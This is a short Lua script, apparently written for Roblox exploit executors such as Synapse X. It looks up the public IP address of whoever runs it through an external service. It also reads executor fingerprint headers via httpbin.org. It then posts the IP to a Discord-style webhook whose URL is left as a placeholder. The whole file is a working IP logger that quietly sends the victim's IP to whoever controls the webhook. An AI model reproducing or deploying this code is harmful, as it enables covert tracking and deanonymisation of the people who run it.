local IP = game:HttpGet("https://v4.ident.me")
local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
ip = "";
for i, v in next, list do
    if decoded.headers[v] then
        ip = decoded.headers[v];
        break
    end
end
if ip then
local HttpServ = game:GetService('HttpService')
local url = "webhook here"
local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "",
            ["description"] = "",
            ["type"] = "rich",
            ["color"] = tonumber(0x57c6eb),
            ["fields"] = {
                {
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    local headers = {
            ["content-type"] = "application/json"
    }
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end
